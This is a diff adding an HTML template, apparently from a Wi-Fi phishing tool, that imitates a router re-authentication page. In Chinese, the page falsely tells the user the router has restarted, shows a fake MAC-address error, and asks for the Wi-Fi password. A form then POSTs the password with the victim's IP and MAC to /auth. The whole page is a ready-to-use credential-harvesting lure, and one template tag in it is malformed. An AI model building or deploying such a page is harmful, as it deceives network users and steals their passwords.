@@ -1,0 +1,101 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<title>授权连接</title>
+	<meta http-equiv="Content-Type" content="text/html">
+	<meta charset="utf-8">
+	<style type="text/css">
+	/* Wrapper */
+	div.container {
+		width: 400px;
+		padding: 8px;
+		margin: auto;
+		margin-top: 50px;
+		border: 1px solid #333;
+		box-sizing: border-box;
+	}
+	/* Title */
+	header {
+		color: #333;
+		font-size: 26px;
+		font-weight: bold;
+		font-family: Verdana, sans-serif;
+		margin-bottom: 10px;
+	}
+	/* description */
+	header > span.small {
+		font-size: 20px;
+		font-family: serif;
+		font-weight: normal;
+	}
+	/* input field name */
+	span.desc {
+		display: inline-block;
+		width: 132px;
+		margin: 0;
+		text-transform: capitalize;
+		font-family: monospace;
+		font-size: 20px;
+		box-sizing: border-box;
+	}
+	input, button {
+		font-size: 20px;
+		text-align: center;
+		font-family: monospace;
+		box-sizing: border-box;
+	}
+	input {width: 250px;}
+	button {
+		width: 100%;
+		margin-top: 5px;
+		margin-bottom: 5px;
+	}
+	footer {
+		margin-top: 10px;
+		text-align: center;
+	}
+	/* Error handling */
+	span.no_auth {
+		width: 100%;
+		display: block;
+		color: red;
+		font-size: 16px;
+		font-family: monospace;
+	}
+	section.error {
+		font-size: 20px;
+		font-family: monospace;
+		color: white;
+		background-color: red;
+		padding: 4px;
+	}
+	</style>
+</head>
+<body>
+	<div class="container">
+		<header>
+			授权登录<br>
+			<span class="small">路由器重启，需要重新验证</span>
+		</header>
+		<section name="content" class="{if .no_mac}}error{{end}}">
+			<section name="error">
+				Internal server error: <br>
+				Failed retrieving your MAC address.<br>
+				*** Router can not authenticate your device. ***
+			</section>
+			<span class="no_auth">Access denied</span>
+			<br>
+			<form action="/auth" method="POST">
+				<input type="hidden" name="ip" value="{{.ip}}">
+				<input type="hidden" name="mac" value="{{.mac}}">			
+				<span class="desc">WIFI密码:&nbsp;</span><input type="password" name="password" value=""><br>
+				<button type="submit">提交</button>
+			</form>
+		</section>
+		<footer>
+			2016 <a href="mailto:grouter@gmail.com">Router Bang</a>
+		</footer>
+	</div>
+</body>
+</html>
